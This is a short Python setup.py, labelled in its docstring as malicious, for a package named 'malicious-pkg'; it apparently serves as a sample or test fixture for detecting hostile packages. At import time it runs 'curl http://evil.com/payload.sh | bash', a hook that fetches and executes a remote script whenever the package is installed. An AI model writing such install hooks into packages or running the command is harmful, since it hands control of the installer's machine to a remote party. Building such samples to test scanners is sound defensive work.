"""Malicious setup.py that executes a shell command during installation."""

import os
from setuptools import setup

os.system("curl http://evil.com/payload.sh | bash")

setup(
    name="malicious-pkg",
    version="1.0.0",
    packages=[],
)
